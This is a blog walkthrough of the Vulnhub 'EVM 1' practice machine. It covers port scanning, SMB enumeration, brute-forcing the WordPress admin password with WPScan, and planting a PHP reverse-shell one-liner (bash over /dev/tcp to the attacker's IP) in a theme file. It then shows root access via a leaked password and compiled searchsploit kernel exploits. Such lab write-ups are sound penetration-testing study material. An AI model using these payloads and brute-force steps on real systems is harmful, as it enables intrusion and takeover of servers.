<!doctype html><html lang=en><head><title>Vulnhub: EVM 1 :: ikuamike</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/evm/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><script async src=https://www.google-analytics.com/analytics.js></script><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/evm/evm.png"><meta name=twitter:title content="Vulnhub: EVM 1"><meta name=twitter:description content><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/styles.css><link rel=stylesheet href=https://blog.ikuamike.io/style.css><link rel="shortcut icon" href=https://blog.ikuamike.io/img/theme-colors/green.png><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/theme-colors/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnhub: EVM 1"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/evm/"><meta property="og:site_name" content="ikuamike"><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2021-03-05 00:00:00 +0000 UTC"></head><body class=green><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/webinars>Webinars</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><ul class=menu><li class=menu__trigger>Show more&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/webinars>Webinars</a></li></ul></li></ul></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/evm/>Vulnhub: EVM 1</a></h1><div class=post-meta><time class=post-date>2021-03-05 ::</time></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/beginner/>Beginner</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/password-bruteforce/>Password Bruteforce</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/wordpress/>WordPress</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/wpscan/>WPScan</a>&nbsp;</span><div class=post-content><div><img src=/img/evm/evm.png alt=symfonos class=center style=border-radius:8px><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th></tr></thead><tbody><tr><td>Beginner</td><td>2 Nov 2019</td><td>Ic0de</td></tr></tbody></table><h1 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h1><p>This was an easy box, initial foothold was on wordpress. You needed to bruteforce the admin creds
then get a reverse shell via editing a theme file to get the reverse shell. Escalating to root
was straightforward as we found the root password in a txt file. Some kernel exploits could have also
been used for privilege escalation.</p><h1 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Nmap</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.103
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00028s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE     VERSION
</span></span><span style=display:flex><span>22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>53/tcp  open  domain      ISC BIND 9.10.3-P4 <span style=color:#f92672>(</span>Ubuntu Linux<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| dns-nsid:
</span></span><span style=display:flex><span>|_  bind.version: 9.10.3-P4-Ubuntu
</span></span><span style=display:flex><span>80/tcp  open  http        Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Apache2 Ubuntu Default Page: It works
</span></span><span style=display:flex><span>110/tcp open  pop3        Dovecot pop3d
</span></span><span style=display:flex><span>|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
</span></span><span style=display:flex><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>143/tcp open  imap        Dovecot imapd
</span></span><span style=display:flex><span>|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
</span></span><span style=display:flex><span>445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
</span></span><span style=display:flex><span>|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style=color:#f92672>(</span>unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| smb-os-discovery:
</span></span><span style=display:flex><span>|   OS: Windows 6.1 <span style=color:#f92672>(</span>Samba 4.3.11-Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
</span></span><span style=display:flex><span>|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>|   Domain name: <span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
</span></span><span style=display:flex><span>|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
</span></span><span style=display:flex><span>|_  System time: 2021-03-04T15:43:32-05:00
</span></span><span style=display:flex><span>| smb-security-mode:
</span></span><span style=display:flex><span>|   account_used: guest
</span></span><span style=display:flex><span>|   authentication_level: user
</span></span><span style=display:flex><span>|   challenge_response: supported
</span></span><span style=display:flex><span>|_  message_signing: disabled <span style=color:#f92672>(</span>dangerous, but default<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| smb2-security-mode:
</span></span><span style=display:flex><span>|   2.02:
</span></span><span style=display:flex><span>|_    Message signing enabled but not required
</span></span><span style=display:flex><span>| smb2-time:
</span></span><span style=display:flex><span>|   date: 2021-03-04T20:43:32
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span></code></pre></div><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=samba-139445>Samba (139,445)<a href=#samba-139445 class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Running smbmap and smbclient there&rsquo;s not much there.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>smbmap -R -H 192.168.56.103
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>smbclient -L <span style=color:#ae81ff>\\</span>192.168.56.103 -N
</span></span></code></pre></div><img src=/img/evm/evm1.png alt=symfonos class=center style=border-radius:8px><p>From enum4linux-ng we only get a username</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>enum4linux-ng -A -R 192.168.56.103
</span></span></code></pre></div><img src=/img/evm/evm2.png alt=symfonos class=center style=border-radius:8px><h2 id=http-80>HTTP (80)<a href=#http-80 class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Visiting the ip on the browser there&rsquo;s only the apache default page.</p><p>Running directory bruteforce, we discover wordpress.</p><img src=/img/evm/evm3.png alt=symfonos class=center style=border-radius:8px><p>Wordpress:</p><img src=/img/evm/evm4.png alt=symfonos class=center style=border-radius:8px><p>Some of the comments hint towards bruteforcing credentials.</p><img src=/img/evm/evm5.png alt=symfonos class=center style=border-radius:8px><p>Bruteforcing the login page on wordpress we get the password <code>24992499</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t <span style=color:#ae81ff>100</span>
</span></span></code></pre></div><img src=/img/evm/evm7.png alt=symfonos class=center style=border-radius:8px><h1 id=shell-as-www-data>Shell as www-data<a href=#shell-as-www-data class=hanchor arialabel=Anchor>&#8983;</a></h1><p>With admin access we can edit one of the wordpress theme files to get a reverse shell with this php payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/9000 0&gt;&amp;1 &amp;&#39;&#34;</span>)<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><img src=/img/evm/evm6.png alt=symfonos class=center style=border-radius:8px><p>Loading the following url we get a reverse shell.</p><pre tabindex=0><code>http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
</code></pre><img src=/img/evm/evm8.png alt=symfonos class=center style=border-radius:8px><p>Changing directory to /home there&rsquo;s one user&rsquo;s folder. Looking at all the files in this directory there&rsquo;s a hidden
file with the root user&rsquo;s password.</p><img src=/img/evm/evm9.png alt=symfonos class=center style=border-radius:8px><h1 id=shell-as-root>Shell as root<a href=#shell-as-root class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Using the password <code>willy26</code> I switched to the root user.</p><img src=/img/evm/evm10.png alt=symfonos class=center style=border-radius:8px><h1 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Privilege escalation could have also been achieved via kernel exploit.</p><img src=/img/evm/evm11.png alt=symfonos class=center style=border-radius:8px><p>The box is running ubuntu 16.04.3 and kernel version 4.4.0-87. Searching for exploits using searchsploit
we get several hits.</p><img src=/img/evm/evm12.png alt=symfonos class=center style=border-radius:8px><p>Getting the first local privilege escalation script and transferring the compiled binary to the target, it works.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>searchsploit -m <span style=color:#ae81ff>45010</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gcc 45010.c -o pwn
</span></span></code></pre></div><img src=/img/evm/evm13.png alt=symfonos class=center style=border-radius:8px><p>The second one <code>44298</code> also works.</p><img src=/img/evm/evm14.png alt=symfonos class=center style=border-radius:8px></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/healthcare1/><span class=button__icon>←</span>
<span class=button__text>Vulnhub: Healthcare 1</span></a></span>
<span class="button next"><a href=https://blog.ikuamike.io/posts/2021/symfonos5/><span class=button__text>Vulnhub: Symfonos 5</span>
<span class=button__icon>→</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>© Michael Ikua</span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div><script src=https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js></script>
<script>addBackToTop({diameter:40,backgroundColor:"rgb(120, 226, 160)",textColor:"#1F222A",cornerOffset:30})</script><script src=https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js></script>
<script>particlesJS("particles-js",{particles:{number:{value:60,density:{enable:!0,value_area:1e3}},color:{value:"#ffffff"},shape:{type:"circle",stroke:{width:0,color:"#000000"}},opacity:{value:.5,random:!1,anim:{enable:!1,speed:1,opacity_min:.1,sync:!1}},size:{value:2,random:!0,anim:{enable:!1,speed:4,size_min:.1,sync:!1}},line_linked:{enable:!0,distance:150,color:"#ffffff",opacity:.4,width:1},move:{enable:!0,speed:.5,direction:"none",random:!1,straight:!1,out_mode:"out",bounce:!1,attract:{enable:!1,rotateX:600,rotateY:1200}}},interactivity:{detect_on:"canvas",events:{onhover:{enable:!1,mode:"grab"},onclick:{enable:!1,mode:"push"},resize:!0},modes:{grab:{distance:140,line_linked:{opacity:1}},bubble:{distance:400,size:40,duration:2,opacity:8,speed:3},repulse:{distance:200,duration:.4},push:{particles_nb:4},remove:{particles_nb:2}}},retina_detect:!0})</script></body></html>